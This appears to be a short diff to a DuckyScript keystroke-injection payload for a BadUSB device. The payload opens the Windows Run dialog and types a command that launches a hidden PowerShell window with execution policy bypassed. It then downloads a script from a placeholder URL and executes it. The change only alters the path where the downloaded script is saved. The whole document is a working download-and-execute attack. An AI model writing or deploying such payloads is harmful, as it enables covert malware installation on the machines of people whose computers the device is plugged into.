@@ -2,7 +2,7 @@ LOCALE US
 DELAY 1500
 GUI r
 DELAY 500
-STRING conhost powershell -w h -ep bypass wget >>URL<< -o w.ps1;~/w.ps1;
+STRING conhost powershell -w h -ep bypass wget >>URL<< -o ~/w.ps1;~/w.ps1;
 ENTER
 
 DELAY 750
